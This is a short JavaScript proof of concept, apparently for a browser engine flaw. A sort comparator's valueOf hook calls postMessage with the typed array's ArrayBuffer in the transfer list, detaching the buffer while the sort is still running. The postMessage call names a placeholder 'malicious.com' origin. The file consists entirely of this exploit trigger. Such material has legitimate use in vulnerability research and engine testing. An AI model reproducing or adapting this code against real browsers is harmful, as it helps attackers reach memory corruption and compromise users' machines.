var buf = new ArrayBuffer(0x10010);
var numbers = new Uint8Array(buf);

function exploit() {
    // This function contains the side effect to demonstrate the vulnerability
    postMessage("Side Effect Vulnerability Detected", "http://malicious.com", [buf]);
    return 7; // Return a harmless value to maintain semblance
}

function compareNumbers(a, b) {
    return { valueOf: exploit }; // Injecting the exploit into the comparison function
}

numbers.sort(compareNumbers); // Triggering the sort operation with the exploit
